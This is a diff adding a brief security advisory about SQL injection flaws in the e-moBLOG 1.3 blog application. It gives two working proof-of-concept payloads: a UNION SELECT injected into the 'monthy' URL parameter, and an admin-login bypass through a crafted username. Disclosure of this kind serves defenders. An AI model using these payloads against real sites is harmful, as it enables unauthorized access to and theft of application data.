@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/16344/info
+
+The e-moBLOG application is prone to multiple SQL injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in SQL queries.
+
+Successful exploitation could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.
+
+Version 1.3 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/emoblog/index.php? monthy=2006017'% 20union%20select% 201,2,3,4,5, 6,7,8,9,10/*#1
+
+http://www.example.com/emoblog/admin/index.php
+username: aaa' union select 'bbb', '[md5-hash of anypass]'/*
+password: [anypass] 
